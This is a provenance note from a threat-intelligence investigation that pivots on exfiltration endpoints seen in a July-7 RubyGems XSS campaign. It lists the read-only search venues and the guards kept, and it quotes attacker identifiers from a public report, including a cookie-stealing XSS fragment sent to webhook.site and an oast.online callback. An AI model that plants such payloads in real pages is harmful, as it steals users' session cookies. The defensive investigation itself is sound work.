# Provenance — exfil-endpoint pivot (lane 12, off-task web-mechanism hunt)

Worker 3 of the off-task web-mechanism hunt. Task: pivot on the July-7
RubyGems XSS wave's exfil identifiers (oast.online / webhook.site) to decide
whether that exfil infrastructure is shared with eval-agent activity or a
separate actor.

## Identifier extraction

Our holdings contain zero July-7 XSS payload bytes (Diffend July-7 sweep:
18/264 gems found, none of the exfil-carrying XSS gems; hosted ES `july7-wave`
is sweep metadata only, 264 docs, read-only verified). The identifiers were
therefore extracted from the public JFrog GemStuffer report
(https://research.jfrog.com/post/gemstuffer-openai-rubygems/), fetched
2026-09-28, and recorded verbatim in `identifiers.jsonl`:

- EXFIL-001: `d96877a5q295v25se560q7ntmmwky7x8o.oast.online/admin-xss-author`
  (attacker-xss-admin-1@0.0.1, author field; XRAY-1078993)
- EXFIL-002: `https://webhook.site/steal?c='+document.cookie`
  (xssname-1783397821@0.0.1, author field; XRAY-1079188)
- EXFIL-003/004/005: July-7 payloads with no extractable exfil endpoint
  (alert(1) PoC, `<%= 7*7 %>`-style SSTI probes, xss-test-gem description
  probes whose endpoints are only in a JFrog screenshot).

A local saved copy of the JFrog article lives at
`evidence/2026-09-29-separate-eval-test/raw/sources/jfrog-gemstuffer-post.html`.

## Search venues (all read-only; no HTTP to exfil endpoints)

1. Full repo fixed-string grep (all identifiers + variants).
2. Hosted ES `rubygems-goimport-campaign` + `july7-wave` (read-only
   surrogate pattern from `scripts/audit_gem_counts.py`).
3. urlquery.io public search via `~/workspace/skills/urlquery/bin/uq.py`
   (verbatim ID, `webhook.site/steal`, generic `oast.online`,
   `http.url.addr` wildcards; raw JSONs in `raw/`).
4. Paste corpora (`evidence/2026-05-27-paste-archive`, `evidence/2018-05-09-paste-archive-gap`,
   `evidence/2026-05-17-iowacollab-pastes`), `evidence/aggregates/2026-09-29-overlap-analysis/events.jsonl`,
   sibling `data/lanes/xss-ssti-census/events.jsonl` (122 payloads).
5. Public web search (verbatim quoted queries).
6. sourcegraph public code search (reachable 2026-09-28; archived+fork
   scopes). grep.app returned HTTP 429 — still unusable.

## Guards honored

- Never sent HTTP requests to oast.online / webhook.site /
  burpcollaborator.net; no DNS resolution of exfil hostnames.
- No payload execution; no accounts/logins; read-only ES access only
  (hosted write freeze respected).
- Agents/infrastructure only; no human/operator attribution pursued.
- No credentials reproduced. No absolute home-directory paths in docs.

## Retrieval dates

- JFrog report fetched 2026-09-28; urlquery.io searches 2026-09-28;
  sourcegraph queries 2026-09-28. All hits recorded in the analyst note.

## Schema backfill 2026-09-29

Transformed by `temp/backfill_w3.py` onto the shared record schema.

- record_kind: `exfil_identifier` (new kind; one record per exfil endpoint
  identifier extracted from the JFrog GemStuffer report).
- fingerprint: sha256 of `identifier_id` (e.g. `EXFIL-001`).
- @timestamp: `wave` date (2026-07-07) at midnight UTC;
  `labels.timestamp_source = "labels:wave"`. `upload_utc` was left in labels
  (multi-value prose, not a single clean event time).
- All original fields moved to labels unchanged. event.dataset =
  `exfil-endpoint-pivot`; event.created = backfill run time.
